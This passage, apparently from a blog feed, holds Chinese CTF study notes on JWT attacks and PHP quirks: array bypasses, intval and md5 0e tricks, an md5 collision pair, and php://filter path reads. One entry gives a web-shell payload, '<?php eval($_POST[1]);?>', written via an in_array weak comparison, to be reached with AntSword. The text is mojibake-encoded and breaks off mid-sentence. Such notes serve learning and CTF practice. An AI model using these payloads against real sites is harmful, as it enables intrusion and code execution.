¡éªŒå³å¯,è¿™å°±æ„å‘³ç€åŸºäºtokenè®¤è¯æœºåˆ¶çš„åº”ç”¨,ä¸éœ€è¦å»è€ƒè™‘ç”¨æˆ·åœ¨å“ªä¸€å°æœåŠ¡å™¨ç™»å½•äº†ï¼Œä¸ºåº”ç”¨çš„æ‰©å±•æä¾›äº†ä¾¿åˆ©ã€‚</p><p>æ–°æŠ€æœ¯å¸¦æ¥ä¾¿åˆ©çš„åŒæ—¶ä¹Ÿä¼šå¸¦æ¥æ–°çš„å®‰å…¨é—®é¢˜ï¼Œå¦‚æœJWTæœ¬èº«å®‰å…¨å­˜åœ¨é—®é¢˜ï¼Œé‚£ä¹ˆæ•´ä¸ªèº«ä»½è®¤è¯æœºåˆ¶å°±ä¼šå¾—ä¸åˆ°ä¿éšœã€‚</p><p>JWTç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç±»ä¼¼äºxxx.yyy.zzzï¼Œå‰ä¸¤éƒ¨åˆ†æ˜¯base64ç¼–ç çš„å†…å®¹ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯åŠ å¯†çš„ç­¾åéƒ¨åˆ†</p><h3 id="å¼±ç­¾åç®—æ³•ï¼ˆæ— ç®—æ³•ï¼‰"><a href="#å¼±ç­¾åç®—æ³•ï¼ˆæ— ç®—æ³•ï¼‰" class="headerlink" title="å¼±ç­¾åç®—æ³•ï¼ˆæ— ç®—æ³•ï¼‰"></a>å¼±ç­¾åç®—æ³•ï¼ˆæ— ç®—æ³•ï¼‰</h3><p>æ›´æ”¹å¤´éƒ¨ä¸­å£°æ˜çš„åŠ å¯†ç®—æ³•</p><h3 id="å¼±å¯†ç "><a href="#å¼±å¯†ç " class="headerlink" title="å¼±å¯†ç "></a>å¼±å¯†ç </h3><p>å¦‚æœJWTä½¿ç”¨HSç³»åˆ—(å¯¹ç§°åŠ å¯†)çš„åŠ å¯†æ–¹æ³•ï¼Œè€Œä¸”ä½¿ç”¨è¾ƒä¸ºç®€å•çš„Keyè¿›è¡ŒåŠ å¯†ï¼Œé‚£ä¹ˆä½¿ç”¨å·¥å…·å°±ææœ‰å¯èƒ½èƒ½å¤Ÿå¾—åˆ°key,ä¹‹åå°±å¯ä»¥éšæ„çš„ç¯¡æ”¹JWTäº†ã€‚<br>jwt_tool&lt;-æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="jwt" scheme="http://example.com/categories/jwt/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>phpååºåˆ—åŒ–</title>
    <link href="http://example.com/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</id>
    <published>2025-03-08T20:13:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°</span><br><span class="line"></span><br><span class="line">__destruct()ï¼Œç±»çš„ææ„å‡½æ•°</span><br><span class="line"></span><br><span class="line">__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line">__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line">__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line">__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="line"></span><br><span class="line">__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="line"></span><br><span class="line">__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line">__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line"></span><br><span class="line">__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="phpååºåˆ—åŒ–" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phpç‰¹æ€§</title>
    <link href="http://example.com/2025/03/04/web/php%E7%89%B9%E6%80%A7/%E5%A5%87%E5%A5%87%E5%A6%99%E5%A6%99%E7%9A%84%E7%89%B9%E6%80%A7/"/>
    <id>http://example.com/2025/03/04/web/php%E7%89%B9%E6%80%A7/%E5%A5%87%E5%A5%87%E5%A6%99%E5%A6%99%E7%9A%84%E7%89%B9%E6%80%A7/</id>
    <published>2025-03-04T18:51:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1ã€æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼"><a href="#1ã€æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="1ã€æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼"></a>1ã€æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">else(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>preg_matchç¬¬äºŒä¸ªå‚æ•°è¦æ±‚æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥æ•°ç»„åˆ™ä¸ä¼šè¿›å…¥ifè¯­å¥</p><p>payload:num[]&#x3D;1</p><h1 id="2ã€intvalå‡½æ•°çš„ä½¿ç”¨"><a href="#2ã€intvalå‡½æ•°çš„ä½¿ç”¨" class="headerlink" title="2ã€intvalå‡½æ•°çš„ä½¿ç”¨"></a>2ã€intvalå‡½æ•°çš„ä½¿ç”¨</h1><p>intval( mixed $value, int $base &#x3D; 10) : int<br>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ value çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š<br>â—¦ å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ<br>â—¦ å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ<br>â—¦ å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>ç§‘å­¦è®¡æ•°æ³•ä¹Ÿå¯ä»¥ç»•è¿‡</p><p>intval(â€˜4476.0â€™)&#x3D;&#x3D;&#x3D;4476    å°æ•°ç‚¹<br>intval(â€˜+4476.0â€™)&#x3D;&#x3D;&#x3D;4476   æ­£è´Ÿå·<br>intval(â€˜4476e0â€™)&#x3D;&#x3D;&#x3D;4476    ç§‘å­¦è®¡æ•°æ³•<br>intval(â€˜0x117câ€™)&#x3D;&#x3D;&#x3D;4476    16è¿›åˆ¶<br>intval(â€˜010574â€™)&#x3D;&#x3D;&#x3D;4476    8è¿›åˆ¶<br>intval(â€˜ 010574â€™)&#x3D;&#x3D;&#x3D;4476   8è¿›åˆ¶+ç©ºæ ¼<br>payload:num&#x3D;4476.0</p><p>è¿™é‡Œè¡¥å……ä¸€ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(42);                      // 42</span><br><span class="line">echo intval(4.2);                     // 4</span><br><span class="line">echo intval(&#x27;42&#x27;);                    // 42</span><br><span class="line">echo intval(&#x27;+42&#x27;);                   // 42</span><br><span class="line">echo intval(&#x27;-42&#x27;);                   // -42</span><br><span class="line">echo intval(042);                     // 34</span><br><span class="line">echo intval(&#x27;042&#x27;);                   // 42</span><br><span class="line">echo intval(1e10);                    // 10000000000</span><br><span class="line">echo intval(&#x27;1e10&#x27;);                  // 10000000000</span><br><span class="line">echo intval(0x1A);                    // 26</span><br><span class="line">echo intval(42000000);                // 42000000</span><br><span class="line">echo intval(420000000000000000000);   // 0</span><br><span class="line">echo intval(&#x27;420000000000000000000&#x27;); // 2147483647</span><br><span class="line">echo intval(42, 8);                   // 42</span><br><span class="line">echo intval(&#x27;42&#x27;, 8);                 // 34</span><br><span class="line">echo intval(array());                 // 0</span><br><span class="line">echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h1 id="3ã€æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦"><a href="#3ã€æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦" class="headerlink" title="3ã€æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦"></a>3ã€æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>i ä¸åŒºåˆ†(ignore)å¤§å°å†™ï¼›må¤š(more)è¡ŒåŒ¹é…ï¼Œè‹¥æœ‰æ¢è¡Œç¬¦åˆ™ä»¥æ¢è¡Œç¬¦åˆ†å‰²ï¼ŒæŒ‰è¡ŒåŒ¹é…</p><p>payload:%0aphp,ç¬¬ä¸€è¡ŒåŒ¹é…æ¢è¡Œåæœ‰phpæ•…é€šè¿‡ï¼Œç¬¬äºŒä¸ªä¸ç¬¦åˆphpå¼€å¤´phpç»“å°¾æ•…ä¸é€šè¿‡</p><h1 id="4ã€highlight-fileè·¯å¾„"><a href="#4ã€highlight-fileè·¯å¾„" class="headerlink" title="4ã€highlight_fileè·¯å¾„"></a>4ã€highlight_fileè·¯å¾„</h1><p>highlight_fileçš„å‚æ•°å¯ä»¥æ˜¯è·¯å¾„çš„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>ifè¯­å¥åªæ¯”å¯¹å­—ç¬¦ä¸²ï¼Œhighlight_fileå¯ä»¥å†™è·¯å¾„ï¼Œæ•…payloadæœ‰å¤šç§è§£æ³•ï¼š</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php              ç»å¯¹è·¯å¾„<br>.&#x2F;flag.php                          ç›¸å¯¹è·¯å¾„<br>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php      phpä¼ªåè®®</p><h1 id="5ã€md5æ¯”è¾ƒç¼ºé™·"><a href="#5ã€md5æ¯”è¾ƒç¼ºé™·" class="headerlink" title="5ã€md5æ¯”è¾ƒç¼ºé™·"></a>5ã€md5æ¯”è¾ƒç¼ºé™·</h1><p>PHPä¸­hashæ¯”è¾ƒæ˜¯å­˜åœ¨ç¼ºé™·çš„ï¼ŒMD5æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥æ•°ç»„åˆ™è¿”å›NULLï¼Œä¸¤ä¸ªNULLæ˜¯å¼ºç›¸ç­‰çš„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])&#123;</span><br><span class="line">    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">else&#123;</span><br><span class="line">    print &#x27;Wrong.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¸åŒæ•°æ®å¼ºç›¸ç­‰</p><p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p><p>md5å¼±æ¯”è¾ƒï¼Œä½¿ç”¨äº†å¼ºåˆ¶ç±»å‹è½¬æ¢åä¸å†æ¥æ”¶æ•°ç»„</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>md5å¼±æ¯”è¾ƒï¼Œä¸º0eå¼€å¤´çš„ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®°æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ‰€ä»¥åªéœ€æ‰¾ä¸¤ä¸ªmd5åéƒ½ä¸º0eå¼€å¤´ä¸”0eåé¢å‡ä¸ºæ•°å­—çš„å€¼å³å¯ã€‚</p><p>ä¸åŒæ•°æ®å¼±ç›¸ç­‰</p><p>payload: a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p><p>MD5ç­‰äºè‡ªèº«ï¼Œå¦‚md5($a)&#x3D;&#x3D;$a,phpå¼±æ¯”è¾ƒä¼šæŠŠ0eå¼€å¤´è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦æ‰¾åˆ°ä¸€ä¸ªMD5åŠ å¯†å‰åéƒ½æ˜¯0eå¼€å¤´çš„ï¼Œå¦‚0e215962017</p><p>md5å¼ºç¢°æ’</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™æ—¶å€™éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªçœŸæ­£çš„md5å€¼ç›¸åŒæ•°æ®</p><p>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><h1 id="6ã€ä¸‰ç›®è¿ç®—ç¬¦çš„ç†è§£-å˜é‡è¦†ç›–"><a href="#6ã€ä¸‰ç›®è¿ç®—ç¬¦çš„ç†è§£-å˜é‡è¦†ç›–" class="headerlink" title="6ã€ä¸‰ç›®è¿ç®—ç¬¦çš„ç†è§£+å˜é‡è¦†ç›–"></a>6ã€ä¸‰ç›®è¿ç®—ç¬¦çš„ç†è§£+å˜é‡è¦†ç›–</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br></pre></td></tr></table></figure></div><p>å¤ªç»å…¸äº†ï¼Œæˆ‘æ™•äº†</p><p>ç¬¬ä¸€è¡Œï¼ŒGETè¢«è®¾ç½®ï¼Œå°±å¯ä»¥ç”¨POSTè¦†ç›–GETçš„å€¼ã€‚ä¸­é—´ä¸¤è¡Œæ„ä¹‰ä¸å¤§ï¼Œæ˜¯flagå°±è¢«COOKIEè¦†ç›–ï¼Œç„¶åè¢«SERVERè¦†ç›–ï¼Œä¸æ˜¯flagè¢«èµ‹å€¼flagç„¶åæ¡ä»¶æˆç«‹ä¹Ÿæ˜¯è¢«SERVERè¦†ç›–ã€‚è€Œä¸”è¿™ä¸ªè¢«è¦†ç›–çš„GETæ²¡æœ‰æŒ‡å®šï¼Œä»»æ„éƒ½è¡Œï¼Œç¬¬å››è¡Œæ‰æ˜¯å…³é”®ï¼Œç­‰äºflagå°±è¾“å‡ºflagï¼Œä¸ç­‰äºæ˜¾ç¤ºæºç ã€‚æ‰€ä»¥åªéœ€è¦ä¼ å…¥ä¸€ä¸ªä»»æ„çš„GETä¿è¯$_GETæ˜¯è¢«è®¾ç½®çš„ã€‚ç„¶åPOSTä¸€ä¸ªè¦†ç›–å®ƒ</p><p>payload:getï¼š1&#x3D;1 postï¼šHTTP_FLAG&#x3D;flag</p><h1 id="7ã€phpå¼±ç±»å‹æ¯”è¾ƒ"><a href="#7ã€phpå¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="7ã€phpå¼±ç±»å‹æ¯”è¾ƒ"></a>7ã€phpå¼±ç±»å‹æ¯”è¾ƒ</h1><p>ç»å…¸</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array();</span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¼±æ¯”è¾ƒå­—ç¬¦ä¸²1.phpä¸1è¿”å›trueã€‚array_pushè¿™ä¸ªå‡½æ•°å¾€é‡Œå¡«æ•°å­—1ï¼Œåˆ™æ˜¯intç±»å‹ï¼Œin_arrayä½¿ç”¨çš„å°±æ˜¯&#x3D;&#x3D;å¼±æ¯”è¾ƒã€‚æ‰€ä»¥ï¼Œå¦‚æœæ•°ç»„é‡Œæœ‰æ•°å­—1ï¼Œä¸å­—ç¬¦ä¸²1.phpæ¯”è¾ƒæ—¶æ˜¯è¿”å›trueçš„ã€‚æ³¨æ„ï¼Œ$array( 1 , â€˜2â€™ , â€˜3â€™ )ï¼Œè¿™é‡Œ1æ˜¯intå‹ï¼Œ2å’Œ3éƒ½æ˜¯stringç±»å‹ã€‚</p><p>è¿™é“é¢˜ï¼Œæ¯æ¬¡ç”Ÿæˆéšæœºæ•°éƒ½åŒ…å«1ï¼Œæ‰€ä»¥1åœ¨æ•°ç»„ä¸­çš„å¯èƒ½æœ€å¤§ã€‚</p><p>payload:n&#x3D;1.php post:content&#x3D;<?php eval($_POST[1]);?>å¤šè¯•å‡ æ¬¡ï¼Œç„¶åèšå‰‘ç›´æ¥è¿</p><h1 id="8ã€andä¸-amp-amp-çš„åŒºåˆ«"><a href="#8ã€andä¸-amp-amp-çš„åŒºåˆ«" class="headerlink" title="8ã€andä¸&amp;&amp;çš„åŒºåˆ«"></a>8ã€andä¸&amp;&amp;çš„åŒºåˆ«</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=true and false and false;</span><br><span class="line">var_dump($a);  è¿”å›true</span><br><span class="line"></span><br><span class="line">$a=true &amp;&amp; false &amp;&amp; false;</span><br><span class="line">var_dump($a);  è¿”å›false</span><br></pre></td></tr></table></figure></div><h1 id="9ã€åå°„ç±»ReflectionClass"><a href="#9ã€åå°„ç±»ReflectionClass" class="headerlink" title="9ã€åå°„ç±»ReflectionClass"></a>9ã€åå°„ç±»ReflectionClass</h1><p>åå°„ç±»è¿˜ä¸å¤ªæ‡‚ï¼Œä½†åšè¿‡é¢˜éƒ½æ˜¯ç›´æ¥è¾“å‡ºè¿™ä¸ªç±»echo new ReflectionClass(â€˜ç±»åâ€™);</p><h1 id="10ã€is-numericä¸hex2bin"><a href="#10ã€is-numericä¸hex2bin" class="headerlink" title="10ã€is_numericä¸hex2bin"></a>10ã€is_numericä¸hex2bin</h1><p>â€‹ is_numericåœ¨PHP5ä¸­æ˜¯å¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶çš„ï¼Œhex2binå‚æ•°ä¸èƒ½å¸¦0x</p><h1 id="11ã€sha1æ¯”è¾ƒç¼ºé™·"><a href="#11ã€sha1æ¯”è¾ƒç¼ºé™·" class="headerlink" title="11ã€sha1æ¯”è¾ƒç¼ºé™·"></a>11ã€sha1æ¯”è¾ƒç¼ºé™·</h1><p>sha1æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚ä¸‹å¯ä½¿ç”¨a[]&#x3D;1&amp;b[]&#x3D;1æ•°ç»„ç»•è¿‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($a==$b)&#123;</span><br><span class="line">    if(sha1($a)==sha1($b))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä½†MD5æˆ–è€…sha1è¿™ç§å¦‚æœå¼ºåˆ¶ç±»å‹è½¬æ¢åï¼Œå°±ä¸æ¥å—æ•°ç»„äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦æ‰¾çœŸæ­£çš„ç¼–ç åç›¸åŒçš„äº†ï¼Œå¦‚</p><p>aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m</p><h1 id="12ã€PHPåŒ-ï¼ˆ-ï¼‰çš„å˜é‡è¦†ç›–"><a href="#12ã€PHPåŒ-ï¼ˆ-ï¼‰çš„å˜é‡è¦†ç›–" class="headerlink" title="12ã€PHPåŒ$ï¼ˆ$$ï¼‰çš„å˜é‡è¦†ç›–"></a>12ã€PHPåŒ$ï¼ˆ$$ï¼‰çš„å˜é‡è¦†ç›–</h1><p>åœ¨åŒå†™$çš„æ—¶å€™ï¼Œå±äºåŠ¨æ€å˜é‡ï¼Œå°±æ˜¯åé¢çš„å˜é‡å€¼ä½œä¸ºæ–°çš„å˜é‡å</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$test=&quot;a23&quot;;    $testç­‰äºa23</span><br><span class="line">$$test=456;        $$testä¹Ÿå°±ç­‰äº$23,è¿™é‡Œç›¸å½“äºç»™$a23èµ‹å€¼äº†</span><br><span class="line">echo $test;        æ­£å¸¸è¾“å‡º$testä¸ºa23</span><br><span class="line">echo $$test;    è¿™é‡Œè¾“å‡º$$testï¼Œå°±æ˜¯$a23ï¼Œä¸º456</span><br><span class="line">echo $a23;        ç¬¬äºŒè¡Œç»™$a23èµ‹å€¼äº†ï¼Œè¿™é‡Œæ­£å¸¸è¾“å‡º</span><br></pre></td></tr></table></figure></div><h1 id="13ã€parse-strå‡½æ•°çš„ä½¿ç”¨"><a href="#13ã€parse-strå‡½æ•°çš„ä½¿ç”¨" class="headerlink" title="13ã€parse_strå‡½æ•°çš„ä½¿ç”¨"></a>13ã€parse_strå‡½æ•°çš„ä½¿ç”¨</h1><p>parse_strä¼šæŠŠå­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¼ å…¥çš„å¤šä¸ªå€¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&quot;q=123&amp;p=456&quot;;</span><br><span class="line">parse_str($a);</span><br><span class="line">echo $q;                è¾“å‡º123</span><br><span class="line">echo $p;                è¾“å‡º456</span><br><span class="line">parse_str($a,$b);        ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºæ•°ç»„ï¼Œè§£æçš„å˜é‡éƒ½å­˜å…¥è¿™ä¸ªæ•°ç»„ä¸­</span><br><span class="line">echo $b[&#x27;q&#x27;];            è¾“å‡º123</span><br><span class="line">echo $b[&#x27;p&#x27;];            è¾“å‡º456</span><br></pre></td></tr></table></figure></div><p>php8ç‰ˆæœ¬å¿…é¡»è¦æœ‰ç¬¬äºŒä¸ªå‚æ•°ï¼Œphp7ä¸å½±å“ä½¿ç”¨ä½†ä¼šè­¦å‘Šä¸€ä¸‹</p><h1 id="14ã€ereg-00æ­£åˆ™æˆªæ–­"><a href="#14ã€ereg-00æ­£åˆ™æˆªæ–­" class="headerlink" title="14ã€ereg %00æ­£åˆ™æˆªæ–­"></a>14ã€ereg %00æ­£åˆ™æˆªæ–­</h1><p>ereg PHP5.3åºŸå¼ƒäº†ï¼ŒåŠŸèƒ½å¯ä»¥ç”±preg_matchä»£æ›¿ï¼Œeregæœ‰ä¸ªæˆªæ–­æ¼æ´ï¼Œå­—ç¬¦ä¸²é‡ŒåŒ…æ‹¬%00å°±åªåŒ¹é…%00ä¹‹å‰çš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥å‰é¢æ 